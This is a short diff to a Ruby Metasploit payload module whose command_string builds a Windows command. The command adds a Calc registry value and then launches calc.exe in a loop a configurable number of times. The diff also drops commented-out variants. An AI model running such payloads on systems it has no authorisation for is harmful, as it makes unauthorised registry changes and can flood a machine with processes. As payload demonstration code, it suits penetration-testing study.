@@ -39,12 +39,7 @@ module Metasploit3
 	def command_string
 		reg_edit = 'reg add "HKCU\Software\Microsoft\Calc" /f /v layout /t REG_DWORD /d 0'
 		loop_count = datastore["NUM"]
-=begin
-		#return "cmd.exe /c #{reg_edit} && " + "start calc.exe"
-		#"FOR /L %i IN (1,1,#{loop_count}) DO (start calc.exe)"
-=end
 		return "cmd.exe /c #{reg_edit} && FOR /L %i IN (0,1,#{loop_count}) DO (start calc.exe)"
-			
 	end
 end
 
